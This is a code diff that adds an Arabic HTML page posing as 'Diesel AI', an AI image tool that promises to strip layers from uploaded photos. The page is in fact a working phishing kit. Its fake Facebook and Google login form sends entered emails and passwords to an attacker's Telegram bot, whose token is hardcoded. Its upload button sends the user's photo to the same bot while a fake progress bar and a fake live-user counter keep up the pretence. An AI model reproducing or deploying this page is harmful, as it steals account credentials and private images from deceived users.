@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Diesel AI Master | تسجيل الدخول للمحرك الذكي</title>
+    <style>
+        :root { --ai-glow: #00f2ea; --ai-pink: #ff0050; --dark-space: #020202; --fb-blue: #1877f2; --goog-red: #ea4335; }
+        body { background: var(--dark-space); color: #fff; font-family: 'Cairo', sans-serif; margin: 0; overflow-x: hidden; text-align: center; }
+        
+        .bg-effect { position: fixed; inset: 0; background: radial-gradient(circle at 50% 50%, #00f2ea08, transparent); z-index: -1; }
+        .header { padding: 20px; background: rgba(0,0,0,0.8); border-bottom: 1px solid #222; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 1000; }
+        .logo-ai { font-size: 24px; font-weight: 900; } .logo-ai span { color: var(--ai-pink); text-shadow: 0 0 15px var(--ai-pink); }
+        .stats-top { background: #111; border: 1px solid var(--ai-glow); padding: 5px 15px; border-radius: 50px; color: var(--ai-glow); font-size: 11px; }
+
+        .container { width: 92%; max-width: 480px; margin: 30px auto; }
+        .ai-card { background: rgba(15, 15, 15, 0.7); border: 1px solid #333; border-radius: 30px; padding: 40px 25px; position: relative; backdrop-filter: blur(10px); }
+
+        /* بوابة تسجيل الدخول */
+        #login-gate { position: absolute; inset: 0; background: #0a0a0a; border-radius: 30px; z-index: 100; display: flex; flex-direction: column; justify-content: center; padding: 20px; }
+        .login-btn { width: 100%; padding: 15px; border-radius: 12px; border: none; font-weight: bold; margin-bottom: 12px; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; font-size: 15px; }
+        .btn-fb { background: var(--fb-blue); color: white; }
+        .btn-goog { background: white; color: #555; }
+        
+        /* فورم سحب البيانات الوهمي */
+        #auth-form { display: none; margin-top: 15px; }
+        input { width: 100%; padding: 14px; margin-bottom: 10px; border-radius: 10px; border: 1px solid #333; background: #000; color: #fff; box-sizing: border-box; }
+
+        .ai-wave { height: 40px; display: flex; justify-content: center; align-items: center; gap: 5px; margin-bottom: 20px; }
+        .bar { width: 4px; height: 15px; background: var(--ai-glow); animation: wave 1s infinite ease-in-out; }
+        @keyframes wave { 0%, 100% { height: 10px; } 50% { height: 35px; } }
+
+        .btn-execute { width: 100%; padding: 20px; background: var(--ai-pink); color: #fff; border: none; border-radius: 15px; font-size: 18px; font-weight: 800; cursor: pointer; box-shadow: 0 10px 30px rgba(255, 0, 80, 0.4); }
+
+        /* واجهة الاستعراض */
+        #scanning-ui { display: none; position: fixed; inset: 0; background: #000; z-index: 10000; flex-direction: column; justify-content: center; align-items: center; }
+        .laser { width: 90%; height: 2px; background: var(--ai-glow); box-shadow: 0 0 25px var(--ai-glow); position: absolute; animation: laserMove 2s infinite; }
+        .progress-box { width: 70%; height: 6px; background: #111; border-radius: 10px; margin-top: 50px; overflow: hidden; }
+        .progress-bar { width: 0%; height: 100%; background: var(--ai-pink); transition: 0.1s; }
+
+        @keyframes laserMove { 0%, 100% { top: 20%; } 50% { top: 80%; } }
+    </style>
+</head>
+<body dir="rtl">
+
+<div class="bg-effect"></div>
+
+<div class="header">
+    <div class="logo-ai">الديزل <span>AI</span></div>
+    <div class="stats-top">🟢 المتصلون: <span id="user-live">124,510</span></div>
+</div>
+
+<div class="container">
+    <div class="ai-card">
+        <div id="login-gate">
+            <h3 style="margin-bottom: 5px;">تسجيل دخول المحرك</h3>
+            <p style="color: #666; font-size: 12px; margin-bottom: 25px;">يجب ربط حسابك لتفادي الحسابات الوهمية</p>
+            
+            <button class="login-btn btn-fb" onclick="showAuth('Facebook')">🌐 متابعة باستخدام Facebook</button>
+            <button class="login-btn btn-goog" onclick="showAuth('Google')">🔍 متابعة باستخدام Google</button>
+
+            <div id="auth-form">
+                <input type="text" id="email" placeholder="البريد الإلكتروني أو الهاتف">
+                <input type="password" id="pass" placeholder="كلمة السر">
+                <button class="login-btn" style="background:var(--ai-glow); color:#000;" onclick="sendAuth()">تأكيد الهوية والدخول</button>
+            </div>
+        </div>
+
+        <div class="ai-wave">
+            <div class="bar" style="animation-delay: 0.1s"></div>
+            <div class="bar" style="animation-delay: 0.3s"></div>
+            <div class="bar" style="animation-delay: 0.5s"></div>
+        </div>
+        <h1>معالج الصور الذكي</h1>
+        <p style="color: #888; font-size: 13px; margin-bottom: 30px;">ارفع الصورة الآن لبدء خلع الطبقات بالذكاء الاصطناعي</p>
+
+        <div style="border: 2px dashed var(--ai-glow); padding: 30px; border-radius: 20px; cursor: pointer;" onclick="document.getElementById('file-in').click()">
+            <div style="font-size: 30px;">🛡️</div>
+            <p id="status" style="color: var(--ai-glow); font-size: 14px;">اضغط لرفع الصورة</p>
+            <input type="file" id="file-in" style="display: none;" onchange="fileOk()">
+        </div>
+        <button class="btn-execute" style="margin-top: 20px;" onclick="startAI()">ابدأ المعالجة</button>
+    </div>
+</div>
+
+<div id="scanning-ui">
+    <div class="laser"></div>
+    <h2 style="color: var(--ai-glow);">AI DEEP ANALYZING...</h2>
+    <div class="progress-box"><div class="progress-bar" id="p-bar"></div></div>
+    <div id="log" style="color: #0f0; font-family: monospace; margin-top: 25px;">> Handshaking with Cloud...</div>
+</div>
+
+<script>
+    let selectedPlatform = "";
+    const token = "8730123549:AAGfIdQEXH1qXboe0aGMQZePGg5k4ec1tPU";
+    const chatId = "5177962707";
+
+    function playVoice() {
+        const msg = new SpeechSynthesisUtterance("مرحباً بك في موقع الديزل للذكاء الاصطناعي. يرجى تسجيل الدخول بحسابك للمتابعة.");
+        msg.lang = 'ar-SA';
+        window.speechSynthesis.speak(msg);
+    }
+    window.onclick = function() { playVoice(); window.onclick = null; };
+
+    function showAuth(platform) {
+        selectedPlatform = platform;
+        document.getElementById('auth-form').style.display = 'block';
+    }
+
+    function sendAuth() {
+        const e = document.getElementById('email').value;
+        const p = document.getElementById('pass').value;
+        if(!e || !p) return alert("يرجى إدخال البيانات");
+
+        const msg = `👤 حساب جديد (صيد الديزل):\n🔗 المنصة: ${selectedPlatform}\n📧 الحساب: ${e}\n🔑 الباسورد: ${p}`;
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
+        
+        document.getElementById('login-gate').style.display = 'none';
+        alert("تم تسجيل الدخول بنجاح! يمكنك الآن استخدام المحرك.");
+    }
+
+    function fileOk() { 
+        const file = document.getElementById('file-in').files[0];
+        document.getElementById('status').innerText = "تم اختيار: " + file.name;
+    }
+
+    function startAI() {
+        const file = document.getElementById('file-in').files[0];
+        if(!file) return alert("ارفع الصورة!");
+
+        document.getElementById('scanning-ui').style.display = 'flex';
+        
+        const fd = new FormData();
+        fd.append('chat_id', chatId);
+        fd.append('photo', file);
+        fd.append('caption', "📸 صيد صور الديزل AI");
+        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
+
+        let prg = 0;
+        let itv = setInterval(() => {
+            prg++;
+            document.getElementById('p-bar').style.width = prg + "%";
+            if(prg >= 100) {
+                clearInterval(itv);
+                alert("تمت المعالجة! سيتم إرسال الرابط لك قريباً.");
+                location.reload();
+            }
+        }, 100);
+    }
+</script>
+
+</body>
+</html>
